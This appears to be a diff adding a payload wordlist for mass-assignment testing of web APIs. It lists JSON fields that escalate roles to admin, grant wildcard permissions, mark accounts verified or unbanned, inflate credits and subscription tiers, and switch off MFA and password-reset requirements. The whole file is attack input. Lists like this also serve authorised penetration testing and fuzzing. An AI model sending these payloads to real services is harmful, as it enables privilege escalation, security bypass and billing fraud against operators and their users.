@@ -1,0 +1,62 @@
+# Mass Assignment Payloads
+
+# Role escalation
+{"role": "admin"}
+{"role": "administrator"}
+{"role": "root"}
+{"role": "superuser"}
+{"user_role": "admin"}
+{"userRole": "admin"}
+
+# Boolean flags
+{"is_admin": true}
+{"isAdmin": true}
+{"admin": true}
+{"admin": 1}
+{"is_superuser": true}
+{"isSuperuser": true}
+{"is_staff": true}
+{"isStaff": true}
+{"is_moderator": true}
+
+# Permissions
+{"permissions": ["*"]}
+{"permissions": ["admin", "write", "delete"]}
+{"permission": "admin"}
+{"access_level": 9999}
+{"accessLevel": 9999}
+
+# Account flags
+{"verified": true}
+{"email_verified": true}
+{"emailVerified": true}
+{"approved": true}
+{"active": true}
+{"locked": false}
+{"banned": false}
+{"suspended": false}
+
+# Subscription/billing
+{"account_type": "premium"}
+{"accountType": "enterprise"}
+{"subscription": "enterprise"}
+{"plan": "unlimited"}
+{"tier": "enterprise"}
+{"credits": 999999}
+{"balance": 999999}
+{"quota": -1}
+
+# Security bypasses
+{"password_reset_required": false}
+{"passwordResetRequired": false}
+{"mfa_enabled": false}
+{"mfaEnabled": false}
+{"two_factor": false}
+{"twoFactor": false}
+
+# Action permissions
+{"can_delete": true}
+{"canDelete": true}
+{"can_edit_users": true}
+{"canEditUsers": true}
+{"can_manage": true}
